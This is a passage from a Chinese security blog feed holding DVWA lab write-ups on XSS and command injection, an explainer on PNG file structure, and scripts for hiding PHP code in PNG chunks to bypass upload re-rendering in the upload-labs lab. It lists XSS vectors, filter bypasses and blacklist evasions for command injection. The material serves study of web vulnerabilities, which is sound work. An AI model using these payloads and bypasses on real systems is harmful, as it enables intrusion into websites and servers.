style="zoom:67%;"><p>确实插入了，但插入的代码并没有在<code>&lt;option&gt;</code>标签值中，故要构造<code>&gt;&lt;option&gt;&lt;img src=1 onerror=alert('hack')&gt;</code>来闭合，但依旧不能弹框，仔细观察发现前面还有一个<code>&lt;select&gt;</code>,故我们要构造一个独立语句打破<code>&lt;select&gt;</code>标签的限制：<code>&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert('hack')&gt;</code></p><img src="/2021/01/27/3/24.jpg" alt="24" style="zoom:50%;"><p>成功~</p><h2 id="high-v3"><a class="header-anchor" href="#high-v3">🍭</a>high</h2><p>白名单 ：只允许上传  French  English German  Spanish 中一个，因为URL中#号之后的内容不会被提交到服务器，故可以构造：<code>English#&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h2 id="impossible-v3"><a class="header-anchor" href="#impossible-v3">🍭</a>impossible</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment"># Don&#x27;t need to do anything, protction handled on the client side</span><span class="hljs-meta">?&gt;</span></code></pre><p>保护在客户端处理，先编写测试看看</p><p><img src="/2021/01/27/3/26.jpg" alt="26"></p><p>发现输入的参数并没有进行URL解码</p><p><img src="/2021/01/27/3/25.jpg" alt="25"></p><p>故XSS漏洞不存在.</p><h1>总结</h1><p>单是刷dvwa并不能全面了解XSS，还有一些本次靶场没用到的标签：</p><p><code>&lt;input&gt;</code></p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span>竞争焦点，从而触发onblur事件<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onblur</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">xss</span>&quot;) <span class="hljs-attr">autofocus</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span>&gt;</span>通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</code></pre><p><code>&lt;details&gt;</code></p><pre><code class="hljs routeros">&lt;details <span class="hljs-attribute">ontoggle</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;使用open属性触发ontoggle事件，无需用户去触发&lt;details open <span class="hljs-attribute">ontoggle</span>=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</code></pre><p><code>&lt;svg&gt;</code></p><pre><code class="hljs abnf">&lt;svg onload=alert(<span class="hljs-string">&quot;xss&quot;</span>)<span class="hljs-comment">;&gt;</span></code></pre><p><code>&lt;video&gt;</code></p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">video</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span></code></pre><p><code>&lt;audio&gt;</code></p><pre><code class="hljs routeros">&lt;audio <span class="hljs-attribute">src</span>=x  <span class="hljs-attribute">onerror</span>=alert(&quot;xss&quot;);&gt;</code></pre><p><code>&lt;textarea&gt;</code></p><pre><code class="hljs abnf">&lt;textarea onfocus=alert(<span class="hljs-string">&quot;xss&quot;</span>)<span class="hljs-comment">; autofocus&gt;</span></code></pre><p>还有绕过方法:</p><h3 id="过滤空格"><a class="header-anchor" href="#过滤空格">🍭</a>过滤空格</h3><p>用<code>/</code>代替空格</p><pre><code class="hljs abnf">&lt;img/src=<span class="hljs-string">&quot;x&quot;</span>/onerror=alert(<span class="hljs-string">&quot;xss&quot;</span>)<span class="hljs-comment">;&gt;</span></code></pre><h3 id="字符拼接"><a class="header-anchor" href="#字符拼接">🍭</a>字符拼接</h3><p>利用eval</p><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</code></pre><p>利用top</p><pre><code class="hljs markdown"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span>top[<span class="hljs-string">&quot;al&quot;+&quot;ert&quot;</span>](<span class="hljs-link">`xss`</span>);<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre><h3 id="编码绕过"><a class="header-anchor" href="#编码绕过">🍭</a>编码绕过</h3><ul><li>Unicode编码绕过</li><li>url编码绕过</li><li>Ascii码绕过</li><li>hex绕过</li><li>八进制</li><li>base64绕过</li></ul><h3 id="过滤括号"><a class="header-anchor" href="#过滤括号">🍭</a>过滤括号</h3><p>当括号被过滤的时候可以使用throw来绕过</p><h3 id="过滤url地址"><a class="header-anchor" href="#过滤url地址">🍭</a>过滤url地址</h3><h4 id="使用url编码"><a class="header-anchor" href="#使用url编码">🍭</a>使用url编码</h4><pre><code class="hljs xquery">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror<span class="hljs-built_in">=document</span>.location=`http://<span class="hljs-meta">%77</span><span class="hljs-meta">%77</span><span class="hljs-meta">%77</span><span class="hljs-meta">%2e</span><span class="hljs-meta">%62</span><span class="hljs-meta">%61</span><span class="hljs-meta">%69</span><span class="hljs-meta">%64</span><span class="hljs-meta">%75</span><span class="hljs-meta">%2e</span><span class="hljs-meta">%63</span><span class="hljs-meta">%6f</span><span class="hljs-meta">%6d</span>/`&gt;</code></pre><h4 id="使用IP"><a class="header-anchor" href="#使用IP">🍭</a>使用IP</h4><ul><li>十进制IP</li><li>八进制IP</li><li>hex</li><li>html标签中用<code>//</code>可以代替<code>http://</code></li></ul><p>详见：<a href="https://xz.aliyun.com/t/4067">XSS</a></p><p>结束~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||Command Injection</title>
    <link href="/2021/01/26/dvwa4/"/>
    <url>/2021/01/26/dvwa4/</url>
    
    <content type="html"><![CDATA[<p>命令注入攻击的常见场景为：仅仅需要输入数据的场合，攻击者构造数据同时输入了恶意命令代码，而系统对此并未过滤，恶意命令代码一并执行，最终导致信息泄露或者正常数据的破坏；PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一。命令注入和代码注入不同，代码注入的目的在于将外部代码注入应用程序本身，并随程序执行；命令攻击的对象是服务器的宿主机。因此用户可以通过构造特殊的输入来达到入侵目的。</p><p>先介绍一下<code>ping</code>:</p><p>Ping是潜水艇人员的专用术语，表示回应的声纳脉冲，在网络中Ping是TCP/IP工具。是用来检测网络的连通情况和分析网络速度。</p><p><img src="/2021/01/26/dvwa4/3.jpg" alt="3"></p><p>ping返回信息的含义</p><table><thead><tr><th>返回信息</th><th>分析</th></tr></thead><tbody><tr><td>Request timed out</td><td>(1)对方已关机，或者网络上没有这个地址                                                                                    (2)对方与本机不在同一网段内                                                                                                 (3)对方确实存在，但设置了ICMP数据包过滤(比如防火墙设置)，可以用带参数 -a 的Ping命令探测对方，如果能得到对方的<code>NETBIOS</code>名称，则说明对方是存在的，有防火墙设置，如果得不到就如(1),(2)                                                                                          (4)错误设置IP地址(TCP/IP设置中，设置了一个与网卡IP地址处于同一子网的IP地址)</td></tr><tr><td>Destination host Unreachable</td><td>(1)对方与本机不在同一网段内，而本机未设置默认的路由                                        　(2) 网线 出了故障                                                                                                                                  <strong>本回应与<code>time out</code>的区别：<code>timeout</code>：所经过的路由器的路由表中具有到达目标的路由，而目标因为其他原因不可到达，本回应：路由表中连到达目标的路由都没有</strong></td></tr><tr><td>Bad IP address</td><td>这个信息表示您可能没有连接到DNS服务器，所以无法解析这个IP地址，也可能是IP地址不存在。</td></tr><tr><td>Source quench received</td><td>对方或中途的服务器繁忙无法回应</td></tr><tr><td>Unknown host</td><td>该远程主机的名字不能被域名服务器(DNS)转换成IP地址。可能是域名服务器有故障，或者其名字不正确，或者网络管理员的系统与远程主机之间的通信线路有故障</td></tr><tr><td>No answer</td><td>本地系统有一条通向中心主机的路由，但却接收不到它发给中心主机的任何信息。原因可能是：中心主机没有工作;本地或中心主机网络配置不正确;本地或中心的路由器没有工作;通信线路有故障;中心主机存在路由选择问题</td></tr><tr><td>no rout to host</td><td>网卡工作不正常</td></tr><tr><td>transmit fai led，error code</td><td>10043网卡驱动不正常</td></tr><tr><td>unknown host name</td><td>DNS配置不正确</td></tr></tbody></table><p>详情：<a href="https://blog.csdn.net/hezeyujiang/article/details/79504038">ping命令详解</a></p><p>输入ip，程序调用系统命令ping这个ip。在ip后面加<code>&amp;&amp;、&amp;、|、||</code>命令拼接符号再跟上自己需要执行的系统命令就构成了命令注入</p><table><thead><tr><th style="text-align:center">A&amp;B</th><th style="text-align:center">A&amp;&amp;B</th><th style="text-align:center">A|B</th><th style="text-align:center">A||B</th></tr></thead><tbody><tr><td style="text-align:center">AB之间无制约关系</td><td style="text-align:center">A执行成功才执行B</td><td style="text-align:center">A的输出作为B的输出</td><td style="text-align:center">A执行失败才执行B</td></tr></tbody></table><h2 id="low"><a class="header-anchor" href="#low">🍭</a>low</h2><p>源码出现了一个函数：<code>stristr( php_uname( 's' ), 'Windows NT' )</code></p><p><code>stristr() </code>函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，返回 FALSE。</p><p>格式：</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">stristr</span><span class="hljs-params">(string,search,before_search)</span></span></code></pre><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><em>string</em></td><td style="text-align:left">必需。规定被搜索的字符串。</td></tr><tr><td style="text-align:left"><em>search</em></td><td style="text-align:left">必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td></tr><tr><td style="text-align:left"><em>before_search</em></td><td style="text-align:left">可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</td></tr></tbody></table><p><code>php_uname()</code>:</p><p>返回运行php的操作系统的相关描述，本关参数mode可取：<code>a</code>包含所有模式</p><table><thead><tr><th style="text-align:center">s</th><th style="text-align:center">n</th><th style="text-align:center">r</th><th style="text-align:center">v</th><th style="text-align:center">m</th></tr></thead><tbody><tr><td style="text-align:center">操作系统名称</td><td style="text-align:center">主机名</td><td style="text-align:center">版本</td><td style="text-align:center">版本信息</td><td style="text-align:center">机器类型</td></tr></tbody></table><p>从源码来看，本关对ip参数并未做任何的过滤。</p><p>先测试一下本地端</p><p><img src="/2021/01/26/dvwa4/1.jpg" alt="1"></p><p><code>bytes</code>：数据包大小，也就是字节</p><p><code>time</code>值：响应往返时间，这个时间越小，说明连接这个地址速度越快。</p><p><code>TTL</code>值：<code>Time To Live</code>,表示DNS记录在DNS服务器上存在的时间，它是IP协议包的一个值，告诉路由器该数据包何时需要被丢弃。可以通过Ping返回的TTL值大小，粗略地判断目标系统类型是Windows系列还是UNIX/Linux系列,<strong>通常情况下，Linux系统的TTL值为64或255，WindowsNT/2000/XP系统的TTL值为128，Windows98系统的TTL值为32，UNIX主机的TTL值为255</strong>，上图为Linux下的测试结果。</p><p><code>Sent</code>发送多个秒包、</p><p><code>Received </code>收到多个回应包</p><p><code>Lost </code>丢弃了多少个包，<code>lost=0</code>时即为网络状态良好</p><p>响应时间<code>Minmum</code> 最小值、<code>MAXimun </code>最大值、<code>Average </code>平均值</p><p>测看看它能不能执行任意命令:<code>127.0.0.1&amp;&amp;echo 小天才</code></p><img src="/2021/01/26/dvwa4/2.jpg" alt="2" style="zoom:80%;"><p>看来是可以的。本关并无过滤，执行其他命令皆可</p><h2 id="medium"><a class="header-anchor" href="#medium">🍭</a>medium</h2><pre><code class="hljs php">$substitutions = <span class="hljs-keyword">array</span>( <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, ）；</code></pre><p>源码中执行了以上过滤操作，跟黑名单差不多，可使用<code>&amp;</code>,<code>&amp;;&amp;</code>( <code>;</code>会被替换为空字符,故执行后又会变成<code>&amp;&amp;</code>)</p><h2 id="high"><a class="header-anchor" href="#high">🍭</a>high</h2><pre><code class="hljs php">$substitutions = <span class="hljs-keyword">array</span>( <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;|  &#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>, );</code></pre><p>本关只是把黑名单的范围扩大了。但仔细观察可以发现<code>'|  ' =&gt; ''</code>中|后面有一个空格，所以<code>|</code>并没有被过滤。</p><h2 id="impossible"><a class="header-anchor" href="#impossible">🍭</a>impossible</h2><p>分析源码：</p><p>熟悉的<code>Anti-CSRF token </code>不再介绍，源码中还进行如下限制</p><pre><code class="hljs arcade"><span class="hljs-comment">// Check IF each octet is an integer </span> <span class="hljs-keyword">if</span>( ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="hljs-symbol">$octet</span> ) == <span class="hljs-number">4</span> ) ) &#123;      <span class="hljs-comment">// If all 4 octets are int&#x27;s put the IP back together. </span>     <span class="hljs-symbol">$target</span> = <span class="hljs-symbol">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-symbol">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-symbol">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-symbol">$octet</span>[<span class="hljs-number">3</span>];</code></pre><p>只有数字.数字.数字.数字的格式才行。相当于黑名单。</p><p><code>stripslashes()</code>：删除字符串string中的反斜杠</p><p><code>is_numeric()</code>和<code>explode()</code>在之前的SQL注入模块都讲过了，不再赘述。</p><p>发现每个模块的impossible里似乎都有这几个家伙。</p><h2 id="总结"><a class="header-anchor" href="#总结">🍭</a>总结</h2><p>虽然此漏洞很厉害，可以直接执行系统命令，但这个漏洞应该不常见（毕竟这么明显，又能让用户执行cmd）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>二次渲染&amp;&amp;png结构分析</title>
    <link href="/2021/01/24/png/"/>
    <url>/2021/01/24/png/</url>
    
    <content type="html"><![CDATA[<h2 id="一-PNG的文件结构"><a class="header-anchor" href="#一-PNG的文件结构">🍭</a>一.PNG的文件结构</h2><h4 id="数据块构成结构"><a class="header-anchor" href="#数据块构成结构">🍭</a>数据块构成结构</h4><p>png定义了两种类型的数据块</p><blockquote><p>关键数据块(critical chunk)//关键数据块定义了4个标准数据块，每个PNG文件都必须包含它们，PNG读写软件也都必须要支持这些数据块。</p></blockquote><blockquote><blockquote><ul><li>PNG标识符</li><li>PNG数据块(IHDR)</li><li>PNG数据块(其他类型数据块)</li><li>PNG结尾数据块(IEND)</li></ul></blockquote></blockquote><blockquote><p>辅助数据块(ancillary chunks)</p></blockquote><h4 id="PNG文件格式中的数据块"><a class="header-anchor" href="#PNG文件格式中的数据块">🍭</a>PNG文件格式中的数据块</h4><table><thead><tr><th><strong>数据块符号</strong></th><th><strong>数据块名称</strong></th><th><strong>多数据块</strong></th><th><strong>可选否</strong></th><th><strong>位置限制</strong></th></tr></thead><tbody><tr><td>IHDR</td><td>文件头数据块</td><td>否</td><td>否</td><td>第一块</td></tr><tr><td>cHRM</td><td>基色和白色点数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>gAMA</td><td>图像γ数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>sBIT</td><td>样本有效位数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>PLTE</td><td>调色板数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>bKGD</td><td>背景颜色数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr></tbody></table><p>PS：数据块的类别还有很多，以上只是一部分。</p><h4 id="数据块结构"><a class="header-anchor" href="#数据块结构">🍭</a>数据块结构</h4><p>PNG中，每个数据块由4个部分组成，如下：</p><table><thead><tr><th><strong>名称</strong></th><th><strong>字节数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Length (长度)</td><td>4字节</td><td>指定数据块中数据域的长度，其长度不超过(231－1)字节</td></tr><tr><td>Chunk Type Code (数据块类型码)</td><td>4字节</td><td>数据块类型码由ASCII字母(A-Z和a-z)组成的“<strong>数据块符号”</strong></td></tr><tr><td>Chunk Data (数据块数据)</td><td>可变长度</td><td>存储按照Chunk Type Code指定的数据</td></tr><tr><td>CRC (循环冗余检测)</td><td>4字节</td><td>存储用来检测是否有错误的循环冗余码</td></tr></tbody></table><p>CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC值算法：</p><p><img src="/2021/01/24/png/1.jpg" alt="1"></p><h2 id="二-PNG图像标识符"><a class="header-anchor" href="#二-PNG图像标识符">🍭</a>二.PNG图像标识符</h2><p>PNG文件头位置由位固定的字节来描述：</p><table><thead><tr><th>十进制数</th><th>137 80 78 71 13 10 26 10</th></tr></thead><tbody><tr><td>十六进制数</td><td>89 50 4E 47 0D 0A 1A 0A</td></tr></tbody></table><p>PEG，PNG,GIF,BMP等图片都具有不同的图像标识符号，判断文件的mimeType类型，应该通过标识符,而不是通过后缀名判断，因为后缀名可以随便修改（之前upload-labs里有提到)</p><h2 id="三-数据块"><a class="header-anchor" href="#三-数据块">🍭</a>三.数据块</h2><h4 id="IHDR数据块"><a class="header-anchor" href="#IHDR数据块">🍭</a>IHDR数据块</h4><p>包含有PNG文件中存储的图像数据的基本信息，且作为第一个数据块出现在PNG数据流中，一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成，格式如下:</p><table><thead><tr><th><strong>域的名称</strong></th><th><strong>字节数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Width</td><td>4 bytes</td><td>图像宽度，以像素为单位</td></tr><tr><td>Height</td><td>4 bytes</td><td>图像高度，以像素为单位</td></tr><tr><td>Bit depth</td><td>1 byte</td><td>图像深度：  索引彩色图像：1，2，4或8  灰度图像：1，2，4，8或16  真彩色图像：8或16</td></tr><tr><td>ColorType</td><td>1 byte</td><td>颜色类型： 0：灰度图像, 1，2，4，8或16  2：真彩色图像，8或16  3：索引彩色图像，1，2，4或8  4：带α通道数据的灰度图像，8或16  6：带α通道数据的真彩色图像，8或16</td></tr><tr><td>Compression method</td><td>1 byte</td><td>压缩方法(LZ77派生算法)</td></tr><tr><td>Filter method</td><td>1 byte</td><td>滤波器方法</td></tr><tr><td>Interlace method</td><td>1 byte</td><td>隔行扫描方法： 0：非隔行扫描  1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td></tr></tbody></table><h4 id="PLTE"><a class="header-anchor" href="#PLTE">🍭</a>PLTE</h4><p>PLTE定义图像的调色板信息,仅与索引彩色图像有关，而且要放在图像数据块之前。它可以包含1~256个调色板信息，每一个调色板信息由3个字节组成，分别为红黄蓝，各占一个字节，0是为黑，255为最大值。调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数，否则PNG图像不合法。</p><h4 id="IDAT"><a class="header-anchor" href="#IDAT">🍭</a>IDAT</h4><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块.IDAT存放着图像真正的数据信息。</p><h4 id="IEND"><a class="header-anchor" href="#IEND">🍭</a>IEND</h4><p>标记PNG文件或者数据流已经结束，放在文件的尾部。文件的结尾12个字符总是<code>00 00 00 00 49 45 4E 44 AE 42 60 82 </code>,IEND数据块的长度总是0，数据标识总是IEND<code>49 45 4E 44</code>（前面upload有提到）</p><p>以下分析实例：</p><img src="/2021/01/24/png/1.png" alt="1" style="zoom:50%;"><p>上图为png格式图片，十六进制分析一下</p><img src="/2021/01/24/png/2.jpg" alt="2" style="zoom:50%;"><p>前八位符合png的头文件标识。</p><img src="/2021/01/24/png/3.jpg" alt="3" style="zoom:50%;"><p>图示范围就是IHDR数据块，</p><ul><li>00 00 00 0D 说明IHDR头块长为13</li><li>49 48 44 52 IHDR标识</li><li>00 00 01 94 图像的宽，404像素</li><li>00 00 01 2E 图像的高，302像素</li><li>08 色深，2^8=256，即这是一个满色的图像</li><li>06 颜色类型，索引图像</li><li>00 PNG Spec规定此处总为0（非0值为将来使用更好的压缩方法预留），表示使压缩方法(LZ77派生算法)</li><li>00 同上</li><li>00 非隔行扫描</li><li><code>A9 94 E4 B3 </code>CRC校验</li></ul><p>接下去的数据到<code>50 4C 54 45 （PLTE标识）</code>前5个都为数据块sBIT,颜色采样率。</p><img src="/2021/01/24/png/4.jpg" alt="4" style="zoom: 33%;"><p>PLTE标识前四个为调色板信息，之后还会有<code>49 44 41 54 IDAT标识</code>,文件过大不一一找出，最后面</p><img src="/2021/01/24/png/5.jpg" alt="5" style="zoom:50%;"><p>如前面所讲。由于辅助数据块都为可选部分，可以通过删除所有的辅助数据块来减少PNG文件的大小。png介绍到这里结束，接下来回归upload-17的png二次渲染绕过。</p><h4 id="写入PLTE数据块"><a class="header-anchor" href="#写入PLTE数据块">🍭</a>写入PLTE数据块</h4><p>php底层对PLTE数据块进行了CRC校验.故可再chunk data域插入php代码,然后重新计算相应的crc值并修改。<strong>此方式只对索引彩色图像的png图片有效</strong>在选取png图片时可根据IHDR数据块的color type辨别。假设php代码为<code>&lt;?php phpinfo();?&gt;</code>进行十六进制逐个编码后为<code>3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 3F 3E</code>找到PLTE标识后将其后18个数据改为代码的编码，然后再计算PLTE数据块的CRC，脚本如下：</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<span class="hljs-keyword">import</span> repng = open(<span class="hljs-string">r&#x27;2.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)a = png.read()png.close()hexstr = binascii.b2a_hex(a)<span class="hljs-string">&#x27;&#x27;&#x27; PLTE crc &#x27;&#x27;&#x27;</span>data =  <span class="hljs-string">&#x27;504c5445&#x27;</span>+ re.findall(<span class="hljs-string">&#x27;504c5445(.*?)49444154&#x27;</span>,hexstr)[<span class="hljs-number">0</span>]crc = binascii.crc32(data[:<span class="hljs-number">-16</span>].decode(<span class="hljs-string">&#x27;hex&#x27;</span>)) &amp; <span class="hljs-number">0xffffffff</span><span class="hljs-keyword">print</span> hex(crc)</code></pre><p>摘自<a href="https://www.zhaosimeng.cn/writeup/72.html">upload-labs</a></p><p>后将CRC值改为运行后的，将此图片上传，即可。</p><p>还有一种思路：写入IDAT数据块</p><p>直接运行脚本</p><pre><code class="hljs angelscript">&lt;?php$p = <span class="hljs-built_in">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);$img = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<span class="hljs-keyword">for</span> ($y = <span class="hljs-number">0</span>; $y &lt; sizeof($p); $y += <span class="hljs-number">3</span>) &#123;   $r = $p[$y];   $g = $p[$y+<span class="hljs-number">1</span>];   $b = $p[$y+<span class="hljs-number">2</span>];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, $color);&#125;imagepng($img,<span class="hljs-string">&#x27;./00.png&#x27;</span>);?&gt;</code></pre><p>摘自<a href="https://www.zhaosimeng.cn/writeup/72.html">upload-labs</a></p><p>jpg也是运用脚本，先上传一张图片在将图片下载至本地用脚本运行再重新上传即可，脚本依旧再上面的链接里。二次渲染就结束啦~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs</title>
    <link href="/2021/01/24/upload/"/>
    <url>/2021/01/24/upload/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#pass-01%E5%89%8D%E7%AB%AFjs%E7%BB%95%E8%BF%87">Pass-01(前端js绕过)</a><ul><li><a href="#%E5%88%A0%E9%99%A4js%E6%A0%A1%E9%AA%8C%E4%BB%A3%E7%A0%81">删除js校验代码</a></li><li><a href="#%E6%9B%B4%E6%94%B9js%E6%A0%A1%E9%AA%8C%E4%B8%AD%E7%9A%84%E7%99%BD%E5%90%8D%E5%8D%95">更改js校验中的白名单</a></li><li><a href="#%E5%85%88%E6%94%B9%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D%E9%80%9A%E8%BF%87js%E6%A0%A1%E9%AA%8C%E5%86%8D%E6%8A%93%E5%8C%85%E6%9B%B4%E6%94%B9%E5%90%8E%E7%BC%80%E4%B8%8A%E4%BC%A0%E8%87%B3%E6%9C%8D%E5%8A%A1%E5%99%A8">先改文件后缀名通过js校验再抓包更改后缀上传至服务器</a></li></ul></li><li><a href="#pass-02mime%E9%AA%8C%E8%AF%81">Pass-02(MIME验证)</a></li><li><a href="#pass-03%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">Pass-03(黑名单绕过)</a></li><li><a href="#pass-04%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-htaccess">Pass-04(黑名单绕过-.htaccess)</a></li><li><a href="#pass-05%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81userini">Pass-05（黑名单验证，.user.ini.）</a></li><li><a href="#pass-06%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87">Pass-06(黑名单验证-大小写绕过)</a></li><li><a href="#pass-07%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87">Pass-07(黑名单验证–空格绕过)</a></li><li><a href="#pass-08%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%82%B9%E5%8F%B7%E7%BB%95%E8%BF%87">Pass-08（黑名单验证–点号绕过）</a></li><li><a href="#pass-09%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6data%E7%BB%95%E8%BF%87">Pass-09(黑名单验证–特殊字符::$DATA绕过)</a></li><li><a 